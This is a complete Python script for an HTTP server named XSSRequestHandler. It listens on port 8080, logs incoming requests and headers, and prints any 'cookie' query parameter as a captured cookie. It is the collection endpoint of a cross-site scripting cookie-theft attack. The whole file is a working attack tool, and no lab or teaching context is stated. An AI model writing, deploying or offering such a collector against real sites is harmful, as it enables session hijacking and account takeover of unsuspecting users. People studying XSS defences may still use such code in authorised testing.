from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse

class XSSRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed_path = urllib.parse.urlparse(self.path)
        query = urllib.parse.parse_qs(parsed_path.query)

        print("\n====== New Request ======")
        print(f"Path: {self.path}")
        print("Headers:")
        print(self.headers)

        if 'cookie' in query:
            print(f"⚠️ Captured Cookie: {query['cookie'][0]}")
        else:
            print("No cookie captured.")

        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

def run(server_class=HTTPServer, handler_class=XSSRequestHandler, port=8080):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f"🚀 Listening on http://localhost:{port} ...")
    httpd.serve_forever()

if __name__ == "__main__":
    run()
